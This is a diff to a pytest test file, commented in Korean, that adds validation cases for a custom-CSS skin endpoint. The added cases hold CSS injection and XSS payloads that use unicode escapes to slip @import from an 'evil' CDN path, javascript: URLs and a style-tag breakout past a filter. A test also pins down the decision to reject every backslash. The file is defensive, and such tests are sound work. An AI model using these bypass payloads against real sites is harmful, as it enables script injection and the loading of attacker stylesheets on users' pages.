@@ -77,6 +77,15 @@ def test_로그인하지_않으면_못_바꾼다(client, make_user):
         "@import url('https://cdn.jsdelivr.net/x.css')",  # 남의 스타일시트를 끌어옴
         "body { background: url(javascript:alert(1)) }",
         "width: expression(alert(1))",  # 옛 IE에서 스크립트가 되던 형태
+        # ── 유니코드 이스케이프 우회 (2026-09-02) ───────────────────────────
+        # CSS 파서는 식별자의 `\XX` 를 문자로 되돌린 **뒤** at-rule을 찾는다. 그래서
+        # 아래 항목에는 `@import`·`javascript:`·`<` 라는 글자가 그대로 들어 있지 않지만,
+        # 브라우저는 이스케이프를 되돌린 뒤 같은 것으로 읽는다.
+        # style-src가 jsdelivr를 허용하므로(terraform/csp-function.js:27) 실제로 로드된다.
+        "@\\69 mport url('https://cdn.jsdelivr.net/gh/evil/x@1/x.css')",
+        "@\\000069mport url('https://cdn.jsdelivr.net/gh/evil/x@1/x.css')",  # 6자리 표기
+        "body { background: url(\\6a avascript:alert(1)) }",  # javascript: 도 같은 우회
+        "\\3c /style><script>alert(1)</script>",  # `<` 도 이스케이프로 쓸 수 있다
     ],
 )
 def test_CSS를_벗어나는_문자열은_거부된다(client, make_user, auth_headers, css):
@@ -109,3 +118,20 @@ def test_평범한_스킨은_통과한다(client, make_user, auth_headers):
     r = client.put("/api/skin", json={"custom_css": css}, headers=auth_headers(admin))
     assert r.status_code == 200
     assert "velog" in client.get("/api/skin").json()["css"]
+
+
+def test_백슬래시는_그_자체로_거부된다(client, make_user, auth_headers):
+    """이스케이프를 해석해 검사하는 대신 **백슬래시를 통째로 막았다**(schemas/user.py).
+
+    브라우저 토크나이저를 다시 구현하면 한 글자 차이로 다시 새기 때문이다. 그래서
+    `@import`를 만들지 않는 평범한 백슬래시도 함께 거절된다 — 스킨은 색·모서리 변수와
+    레이아웃 조정용이라 잃는 것이 없다고 판단했고, 그 판단을 여기에 고정해 둔다.
+    (필요해지면 이 테스트가 먼저 빨간불이 되고, 그때 검사 방식을 다시 고른다.)"""
+    admin = make_user(role="admin")
+    r = client.put(
+        "/api/skin",
+        json={"custom_css": 'article::after { content: "\\2192" }'},
+        headers=auth_headers(admin),
+    )
+    assert r.status_code == 422
+    assert client.get("/api/skin").json()["css"] == ""
